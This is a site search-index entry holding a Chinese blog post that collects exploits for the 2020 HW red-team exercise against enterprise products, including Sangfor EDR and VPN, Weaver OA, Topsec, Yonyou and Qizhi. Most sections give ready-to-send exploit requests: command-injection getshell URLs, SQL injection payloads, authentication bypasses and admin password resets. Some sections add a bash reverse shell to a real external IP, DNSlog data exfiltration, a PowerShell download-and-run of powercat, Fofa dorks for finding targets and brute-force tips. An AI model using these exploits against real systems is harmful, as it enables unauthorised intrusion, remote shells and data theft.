<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020HW漏洞武器库</title>
      <link href="post/hw.html"/>
      <url>post/hw.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）"><a href="#齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）"></a>齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）</h2><p>1 、 访 问<code>http://10.20.10.11/listener/cluster_manage.php</code> : 返 回 “OK”.（ 未 授 权 无 需 登 录 ）</p><p>2、访问如下链接即可获得getshell，执行成功后，生成PHP一句话马</p><p><code>https://10.20.10.10/ha_request.php？action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|echo$&#123;IFS&#125;&quot;ZWNobyAnPD9waHAgQGV2YW</code></p><p>3.getshell访问路径：</p><p><code>/var/www/shterm/resources/qrcode/lbj77.php</code><br><code>https://10.20.10.10/shterm/resources/qrcode/lbj77.php(密码10086)</code><br><img src="/image/HW/1.jpg" alt="1"><br>据说还是另外一个版本是java的:</p><p>POST /shterm/listener/tui_update.</p><p>a=[“t’;import os;os.popen(‘whoami’)#”]<br><img src="/image/HW/2.jpg" alt="1"></p><h2 id="天融信TopApp-LB-负载均衡系统Sql注入漏洞"><a href="#天融信TopApp-LB-负载均衡系统Sql注入漏洞" class="headerlink" title="天融信TopApp-LB 负载均衡系统Sql注入漏洞"></a>天融信TopApp-LB 负载均衡系统Sql注入漏洞</h2><p>1.利用POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1 Host: localhost</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">t&#x3D;l&amp;e&#x3D;0&amp;s&#x3D;t&amp;l&#x3D;1&amp;vid&#x3D;1+union select 1,2,3,4,5,6,7,8,9,substr(&#39;a&#39;,1,1),11,12,13,14,15,16,17,18,19,20,21,22--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/image/HW/12.jpg" alt="1"></p><p>2.2个历史漏洞仍然可以复现</p><p><code>https://www.uedbox.com/post/21626/</code></p><p>用户名: 随意 密码：;id（天融信负载均衡TopApp-LB系统无需密码直接登陆） </p><p><code>https://www.uedbox.com/post/22193/</code></p><p>用户名: ; ping 9928e5.dnslog.info;echo  密码：任意<br><img src="/image/HW/13.jpg" alt="1"></p><h2 id="用友GRP-u8-注入"><a href="#用友GRP-u8-注入" class="headerlink" title="用友GRP-u8 注入"></a>用友GRP-u8 注入</h2><p>利用POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Proxy HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0;) </span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 341 </span><br><span class="line">Connection: Keep-Alive </span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">cVer&#x3D;9.8.0&amp;dp&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;GB2312&quot;?&gt;&lt;R9PACKET version&#x3D;&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;&#x2F;DATAFORMAT&gt;</span><br><span class="line">&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;&#x2F;NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;&#x2F;NAME&gt;&lt;DATA</span><br><span class="line">format&#x3D;&quot;text&quot;&gt;DataSetProviderData&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;exec xp_cmdshell &#39;whoami&#39;&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;&#x2F;PARAMS&gt;&lt;&#x2F;R9FUNCTION&gt;&lt;&#x2F;R9PACKET&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/HW/15.jpg" alt="1"></p><h2 id="绿盟UTS综合威胁探针管理员任意登录"><a href="#绿盟UTS综合威胁探针管理员任意登录" class="headerlink" title="绿盟UTS综合威胁探针管理员任意登录"></a>绿盟UTS综合威胁探针管理员任意登录</h2><p>逻辑漏洞,利用方式参考：<code>https://www.hackbug.net/archives/112.htmlhttp://www.hackbug.net/archives/112.html</code> </p><p>1、修改登录数据包 {“status”:false,”mag”:””} -&gt; {“status”:true,”mag”:””}</p><p>2、/webapi/v1/system/accountmanage/account接口逻辑错误泄漏了管理员的账户信息包括密码（md5） </p><p>3、再次登录,替换密码上个数据包中md5密码</p><p>4、登录成功<br><img src="/image/HW/16.jpg" alt="1"></p><p>漏洞实际案例：</p><p><img src="/image/HW/9.jpg" alt="1"><br><img src="/image/HW/8.jpg" alt="1"><br>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码<br><img src="/image%5CHW%5C7.jpg" alt="1"></p><p><img src="/image/HW/5.jpg" alt="1"><br><img src="/image/HW/4.jpg" alt="1"><br>利用渠道的md5值去登录页面<br><img src="/image/HW/3.jpg" alt="1"><br>7ac301836522b54afcbbed714534c7fb</p><p><img src="/image/HW/17.jpg" alt="1"></p><h2 id="天融信数据防泄漏系统越权修改管理员密码"><a href="#天融信数据防泄漏系统越权修改管理员密码" class="headerlink" title="天融信数据防泄漏系统越权修改管理员密码"></a>天融信数据防泄漏系统越权修改管理员密码</h2><p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd，接口未授权访问,造成直接修改任意用户密码，默认superman账户uid为1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?module&#x3D;auth_user&amp;action&#x3D;mod_edit_pwd </span><br><span class="line"></span><br><span class="line">Cookie: username&#x3D;superman;</span><br><span class="line"></span><br><span class="line">uid&#x3D;1&amp;pd&#x3D;Newpasswd&amp;mod_pwd&#x3D;1&amp;dlp_perm&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="/image/HW/18.jpg" alt="1"></p><h2 id="WPS-Office-图片解析错误导致堆损坏，任意代码执行"><a href="#WPS-Office-图片解析错误导致堆损坏，任意代码执行" class="headerlink" title="WPS Office 图片解析错误导致堆损坏，任意代码执行"></a>WPS Office 图片解析错误导致堆损坏，任意代码执行</h2><p>相关参考:<code>http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</code></p><h2 id="SANGFOR终端检测响应平台-任意用户登录"><a href="#SANGFOR终端检测响应平台-任意用户登录" class="headerlink" title="SANGFOR终端检测响应平台-任意用户登录"></a>SANGFOR终端检测响应平台-任意用户登录</h2><p>fofa指纹：title=”SANGFOR终端检测响应平台” </p><p>漏洞利用：</p><p>payload：</p><p><code>https://ip/ui/login.php?user=需登录的用户名列</code> </p><p>如 ： <code>https://1.1.1.1:1980/ui/login.php?user=admin</code> </p><p>查询完毕以后即可登录平台。<br><img src="/image/HW/19.gif" alt="1"></p><h2 id="某信服EDR漏洞-包含payload"><a href="#某信服EDR漏洞-包含payload" class="headerlink" title="某信服EDR漏洞-包含payload"></a>某信服EDR漏洞-包含payload</h2><p>1.漏洞利用方法：</p><p><code>https://xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;host=whoami</code><br><img src="/image/HW/20.jpg" alt="1"></p><p>2.批量利用方法</p><p>网上已经放出批量利用方法了，如下：<code>https://github.com/A2gel/sangfor-edr-exploit</code><br>3.使用方法单个url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python edr.py url [http:&#x2F;&#x2F;10.10.10.10](http:&#x2F;&#x2F;10.10.10.10&#x2F;)</span><br><span class="line"></span><br><span class="line">Command&gt; whoami</span><br><span class="line"></span><br><span class="line">Try [http:&#x2F;&#x2F;10.10.10.10](http:&#x2F;&#x2F;10.10.10.10&#x2F;) root</span><br></pre></td></tr></table></figure><p>批量url 需要在目录下创建xxx.txt 一行一个url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python edr.py file 1.txt whoami</span><br><span class="line"></span><br><span class="line">Try: http:&#x2F;&#x2F;10.10.10.10 root</span><br><span class="line">Try: http:&#x2F;&#x2F;10.10.10.11</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sangfor-EDR-RCE漏洞"><a href="#sangfor-EDR-RCE漏洞" class="headerlink" title="sangfor EDR RCE漏洞"></a>sangfor EDR RCE漏洞</h2><ol><li>漏 洞 原 理 :<br>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口主要调用<br><img src="/image/HW/21.jpg" alt="1"></li></ol><p><img src="/image/HW/22.jpg" alt="1"><br>跟进<br><img src="/image/HW/23.jpg" alt="1"><br><br>可以看到 第一个检查为 <code>$req_url = $_SERVER[&#39;PHP_SELF&#39;];</code> </br><br>绕过第一个检查:<br><br>在他们系统nginx配置文件里面:</br><br><img src="/image/HW/24.jpg" alt="1"><br>通过nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问<br><code>/api/edr/sangforinter/v2/xxx</code> 绕过 第一个检查<br><br>第二检查: 权限检查</br><br><img src="/image/HW/25.jpg" alt="1"><br>跟进check_access_token<br><img src="/image/HW/26.jpg" alt="1"><br>这里<code>if($md5_str == $json_token[&quot;md5&quot;])</code> 引发第二个漏洞: php弱类型导致的漏洞绕过只需要传入一个base64编码的json内容为 {“md5”:true}即可<br><br>至此 权限检查绕过完毕</br><br>来到 process_cssp.php 文件<br><img src="/image/HW/27.jpg" alt="1"><br>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的. 绕过:<code>&#123;&quot;params&quot;:&quot;w=123\&quot;&#39;1234123&#39;\&quot;|命令&quot;&#125;</code></p><p>2.利用POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post &#x2F;api&#x2F;edr&#x2F;sanforinter&#x2F;v2&#x2F;cssp&#x2F;slog_client?token&#x3D;ssskbkds HTTP&#x2F;1.1.</span><br><span class="line"></span><br><span class="line">&#123;&quot;params&quot;:&quot;w&#x3D;123\&quot;&#39;1234123&#39;\&quot;|bash -i &gt;&#x2F;dev&#x2F;tcp&#x2F;167.179.118.219&#x2F;8899 0&gt;&amp;1&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/image/HW/28.jpg" alt="1"><br>外网linux反弹监听NC端口<br>nc -lvvp 889<br><img src="/image/HW/29.jpg" alt="1"><br>深信服EDR 远程命令执行的技巧：</p><p><code>/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9</code></p><p><code>&#123;&quot;params&quot;: &quot;w=123\&quot;&#39;1234123&#39;\&quot;|curl `whoami`.dnslog.cn&quot;&#125;</code><br><img src="/image/HW/30.jpg" alt="1"></p><h2 id="联软科技产品存在任意文件上传和命令执行漏洞"><a href="#联软科技产品存在任意文件上传和命令执行漏洞" class="headerlink" title="联软科技产品存在任意文件上传和命令执行漏洞"></a>联软科技产品存在任意文件上传和命令执行漏洞</h2><p>1.影响范围:</p><p>联软科技相关产品</p><p>2.漏洞描述:</p><p>任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。</p><p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p><p>3.规避措施:</p><p>建议各单位在修补漏洞前制定详细的书面方案，方案需要包含升级、业务验证、回退等内容。升级加固操作建议在业务闲时进行操作，各单位可以分批次，采取先验证后批量修复的方式开展升级工作。如果在修复时发生异常，建议按照预先制定的应急预案进行回退，确保不影响业务的正常运行。各单位在升级后需进行相关业务验证，确保本次漏洞临时修复方案对业务零影响。</p><h2 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h2><p>1.漏洞简介</p><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p><p>2.影响组件： 泛微OA</p><p>3.漏洞指纹</p><p>   Set-Cookie: ecology_JSessionId=ecology/weaver/bsh.servlet.BshServlet</p><p>4.Fofa Dork</p><p>   app=”泛微-协同办公OA”</p><p>5.漏洞分析</p><p>   <code>[https://www.freebuf.com/vuls/215218.html]</code></p><p>   <code>https://github.com/beanshell/beanshell</code>    </p><p>   <code>http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</code></p><p>6.漏洞利用利用POC:</p><pre><code> POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;    Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;b sh.servlet.output=raw</code></pre><p>   CNVD-2019-32204利用脚本：</p><p>   <code>https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</code></p><p>   批量脚本执行：</p><pre><code> pip install requests python Weaver-Ecology-OA_RCE-exp.py</code></pre><p>   url.txt文件中 是url地址 需要带http协议</p><p>7.利用技巧</p><p>其他形式绕过</p><p>eval%00(“ex”%2b”ec(&quot;whoami&quot;)”); 也可以换成 ex\u0065c(“cmd /c dir”); </p><p>;泛微多数都是windows环境, 反弹shell可以使用pcat</p><p>;Powershell </p><p>;IEX(New-Object</p><p>   &nbsp;System.Net.Webclient).DownloadString(‘<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);pow">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);pow</a></p><p>;ercat -c ip -p 6666 -e cmd</p><p>8.防护方法     </p><p>1.及时更新泛微补丁</p><p>2.拦截/weaver/bsh.servlet.BshServlet目录的访问</p><h2 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h2><p>1.漏洞简介</p><p>泛微OA在国内的用户很多,漏洞以前也很多,但现在在漏洞盒子托管了企业SRC： <a href="https://weaversrc.vulbox.com/">https://weaversrc.vulbox.com/</a>, 情况有所好转</p><p>2.影响组件泛微OA</p><p>3.漏洞指纹</p><p><code>Set-Cookie: ecology_JSessionId= ecology WorkflowCenterTreeData</code></p><p><code>/mobile/plugin/SyncUserInfo.jsp</code></p><p>4.Fofa Dork</p><p>app=”泛微-协同办公OA”</p><p>5.漏洞分析</p><p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<a href="https://xz.aliyun.com/t/6531">https://xz.aliyun.com/t/6531</a></p><p>6.漏洞利用</p><p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现： 修改NULL后为要查询的字段名,修改from后为查询的表：</p><pre><code> POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0 d%0a%0d%0a%0</code></pre><p><img src="/image/HW/31.jpg" alt="1"><br><code>https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql _inject.py</code><br><br>应用安全 – 软件漏洞 – 泛微OA漏洞汇总：</br><br><a href="https://blog.csdn.net/weixin_30855099/article/details/101191532">https://blog.csdn.net/weixin_30855099/article/details/101191532</a><br>/mobile/plugin/SyncUserInfo.jsp 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述<br><br>7.利用技巧</br>                                                                                           <br>1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</br></p><p>2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p><p>3.这里可以绕过的原因是泛微某个过滤器初始化错误,当长度超过xssMaxLength=500的时候就不进入安全检测, 修复以后是xssMaxLength=1000000,所以随便你填充%0a%0d还是空格都可以绕过注入检测</p><p>4.泛微后端数据库版本存在差异, 但是可以通用检测。已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致所以这里筛选出一个相对通用的检测手法(下面代码是python的” “<em>800 800个空格)<br><br>“-1) “+” “<em>800+ “union select/</em></em>/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=(‘sysadmin’”</br></p><p>老版本可以在关键字后面加 // 来绕过sql检测<br>   <br>新版本可以通过加入大量空格/换行来绕过sql检测mssql,oracle中都有Hrmresourcemanager , 这是管理员信息表</br><br>   就Hrmresource表中没有用户, Hrmresourcemanager 表中也一定会存在sysadmin账户，所以进行union select的时候一定会有数据。这里也可以使用 “-1) “+” “*800+ “ or// 1=1 and id&lt;(5”，这里使用 &lt;5 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用</p><p>8.防护方法</p><p>1.及时更新泛微补丁<br>2.泛微最好不要开放到公网<br>3.使用waf拦击</p><h2 id="深信服VPN远程代码执行"><a href="#深信服VPN远程代码执行" class="headerlink" title="深信服VPN远程代码执行"></a>深信服VPN远程代码执行</h2><p>1.漏洞简介</p><p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p><p>2.影响组件：</p><p>深信服 VPN</p><p>3.漏洞指纹</p><p>Set-Cookie: TWFID=welcome to ssl vpn Sinfor</p><p>4.Fofa Dork</p><p>header=”Set-Cookie: TWFID=”</p><p>5.漏洞分析<br>深 信 服 vpnweb 登 录 逆 向 学 习 ： <a href="http://www.cnblogs.com/potatsoSec/p/12326356.html">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p><p>6.漏洞利用</p><p>wget -t %d -T %d –spider %s</p><p>7.利用技巧</p><p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网<br>2.该版本较低,<code>whomai</code>不存在,可以使用<code>uname</code>,这里没有空格可dns传出来<br>3.去除空格也简单 <code>cat /etc/passwd | tr &quot; \n&quot; &quot;+|&quot;</code></p><p>8.防护方法<br>1.及时更新补丁<br>2.升级到最新版</p><h2 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h2><p>1.漏洞简介</p><p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p><p>2.影响组件</p><p>深信服 VPN</p><p>3.漏洞指纹</p><p><code>/por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd=</code></p><p>4.Fofa   Dork </p><p>app=”深信服-SSL-VPN”</p><p>5.漏洞分析</p><p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a></p><p>此处存疑, 时间问题没有测试</p><p>6.漏洞利用</p><p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)<br>      #encoding=utf8<br>      import requests<br>      import hashlib<br>      import urllib3<br>      urllib3.disable_warnings()<br>      import re</p><pre><code>  session = requests.session()  def SanForLogin(target, password, username=&quot;admin&quot;):     # 加密密码的算法是 sha1(password+sid)      # 没有公开POC就不写了  SanForLogin(&quot;https://xxxxxxxxxxx/&quot;, &quot;admin&quot;)</code></pre><p>7.利用技巧</p><p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多国外APT组织应该也批量爆破了一波，加密的密码也就是 <code>sha1(password+sid)</code></p><p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些admin/123456/Sangfor/Sangfor@123 </p><p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p><p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧。深信服SSLVPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell</p><p><a href="http://www.uedbox.com/post/31092/">https://www.uedbox.com/post/31092/</a></p><p>8.防护方法  </p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞"><a href="#常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞" class="headerlink" title="常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞"></a>常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞</h2><p>1.漏洞简介</p><p>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p><p>2.影响组件</p><p>防火墙, 网关, 路由器, VPN</p><p>3.漏洞指纹</p><p>防火墙, 网关, 路由器, VPN</p><p>4.Fofa Dork防火墙, 网关, 路由器, VPN 的名称</p><p>5.漏洞利用</p><p>【安全设备】常见网络安全设备默认口令<a href="http://www.it2021.com/security/614.html">https://www.it2021.com/security/614.html</a></p><p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p><p>7.利用技巧</p><p>这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令，admin root 123456 永远的神内网的安全平台就是个漏洞指南</p><p>8.防护方法</p><p>1.设置强口令</p><p>2.限制来源IP</p><h2 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h2><p>1.漏洞简介</p><p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p><p>2.影响组件</p><p>Thinkphp</p><p>3.漏洞指纹</p><p>Thinkphp X-Powered-By: ThinkPHP</p><p>4.Fofa Dork </p><p>app=”ThinkPHP”</p><p>5.漏洞分析      </p><p>ThinkPHP漏洞总结 – 赛克社区<br><a href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a></p><p>挖 掘 暗 藏 ThinkPHP 中 的 反 序 列 利 用 链 ： <a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/</a></p><p>ThinkPHP 使 用 不 当 可 能 造 成 敏 感 信 息 泄 露 ： <a href="https://blog.csdn.net/Fly_hps/article/details/81201904">https://blog.csdn.net/Fly_hps/article/details/81201904</a></p><p>DSMall 代 码 审 计 ： <a href="http://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p><p>6.漏洞利用</p><p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p><p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<a href="https://github.com/Dido1960/thinkphp">https://github.com/Dido1960/thinkphp</a></p><p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<a href="https://github.com/whirlwind110/tphack">https://github.com/whirlwind110/tphack</a></p><p>7.利用技巧</p><p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p><p>2.自从挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p><p>3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞DSMall代码审计 – 安全客，安全资讯平台</p><p><a href="http://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p><p>8.防护方法<br>1.及时更新补丁<br>2.升级到最新版Thinkphp<br>3.前置WAF进行防护</p><h2 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h2><p>1.漏洞简介</p><p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p><p>2.影响组件</p><p>Spring xxx</p><p>3.漏洞指纹</p><p>X-Application-Context:</p><p>4.Fofa Dork</p><p>app=”Spring-Framework”</p><p>5.漏洞分析</p><p>Spring 框架漏洞集合：</p><p><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a> Exploiting Spring Boot Actuators | Veracode blog</p><p><a href="http://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p><p>Spring Boot Actuators 配 置 不 当 导 致 RCE 漏 洞 复 现 ： <a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD</a></p><p>%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</p><p>6.漏洞利用</p><p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE <a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p><p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>7.利用技巧</p><p>1.Spring Boot Actuators 